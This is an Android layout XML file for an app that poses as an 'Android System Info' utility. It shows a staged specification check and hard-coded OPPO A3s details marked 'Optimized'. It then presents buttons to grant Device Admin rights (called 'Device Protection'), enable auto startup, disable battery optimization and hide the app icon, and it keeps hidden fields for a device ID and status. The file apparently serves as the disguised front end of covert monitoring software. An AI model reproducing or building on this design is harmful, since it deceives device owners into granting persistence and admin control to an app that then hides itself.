<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:padding="20dp"
    android:gravity="center"
    android:background="#0f172a"
    tools:context=".MainActivity">

    <!-- Loading View (Shown for 2.5 seconds) -->
    <LinearLayout
        android:id="@+id/layoutLoading"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:gravity="center"
        android:visibility="visible">

        <ImageView
            android:layout_width="90dp"
            android:layout_height="90dp"
            android:src="@drawable/ic_android_system"
            android:contentDescription="Android System Logo"
            android:layout_marginBottom="24dp" />

        <ProgressBar
            android:layout_width="48dp"
            android:layout_height="48dp"
            android:indeterminateTint="#3b82f6"
            android:layout_marginBottom="16dp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="Checking System Specifications..."
            android:textColor="#94a3b8"
            android:textSize="15sp" />
    </LinearLayout>

    <!-- Full Device Details View (Shown after loader) -->
    <ScrollView
        android:id="@+id/layoutDetails"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:visibility="gone">

        <LinearLayout
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:orientation="vertical"
            android:gravity="center_horizontal"
            android:background="#1e293b"
            android:padding="20dp">

            <ImageView
                android:layout_width="72dp"
                android:layout_height="72dp"
                android:src="@drawable/ic_android_system"
                android:contentDescription="Android System Logo"
                android:layout_marginBottom="12dp" />

            <TextView
                android:layout_width="wrap_content"
                android:layout_height="wrap_content"
                android:text="Android System Info"
                android:textColor="#ffffff"
                android:textSize="20sp"
                android:textStyle="bold"
                android:layout_marginBottom="16dp"/>

            <!-- Oppo A3s Specifications List -->
            <TextView
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Device: OPPO A3s (CPH1803)\nOS: ColorOS 5.1 (Android 8.1.0)\nCPU: Qualcomm Snapdragon 450 (Octa-core 1.8 GHz)\nRAM: 3 GB LPDDR3\nStorage: 32 GB eMMC 5.1\nDisplay: 6.2&quot; HD+ (1520 x 720)\nBattery: 4230 mAh Li-Ion\nStatus: Optimized"
                android:textColor="#e2e8f0"
                android:textSize="13.5sp"
                android:lineSpacingExtra="6dp"
                android:background="#0f172a"
                android:padding="16dp"
                android:layout_marginBottom="20dp"/>

            <Button
                android:id="@+id/btnAdmin"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Enable Device Protection (Device Admin)"
                android:textColor="#ffffff"
                android:backgroundTint="#3b82f6"
                android:textSize="13sp"
                android:textStyle="bold"
                android:layout_marginBottom="10dp" />

            <Button
                android:id="@+id/btnAutoStart"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Enable ColorOS Auto Startup"
                android:textColor="#ffffff"
                android:backgroundTint="#10b981"
                android:textSize="13sp"
                android:textStyle="bold"
                android:layout_marginBottom="10dp" />

            <Button
                android:id="@+id/btnBattery"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Disable Battery Optimization"
                android:textColor="#ffffff"
                android:backgroundTint="#8b5cf6"
                android:textSize="13sp"
                android:textStyle="bold"
                android:layout_marginBottom="16dp" />

            <Button
                android:id="@+id/btnHideIcon"
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:text="Hide App Icon"
                android:textColor="#ffffff"
                android:backgroundTint="#ef4444"
                android:textSize="14sp"
                android:textStyle="bold"
                android:padding="12dp" />
        </LinearLayout>
    </ScrollView>

    <!-- Invisible legacy components -->
    <EditText
        android:id="@+id/etDeviceName"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:visibility="gone" />

    <TextView
        android:id="@+id/tvMyDeviceId"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:visibility="gone" />

    <TextView
        android:id="@+id/tvStatus"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:visibility="gone" />

    <ProgressBar
        android:id="@+id/spinnerLoader"
        style="?android:attr/progressBarStyleHorizontal"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:visibility="gone" />

    <ProgressBar
        android:id="@+id/progressBar"
        style="?android:attr/progressBarStyleHorizontal"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:visibility="gone" />

</LinearLayout>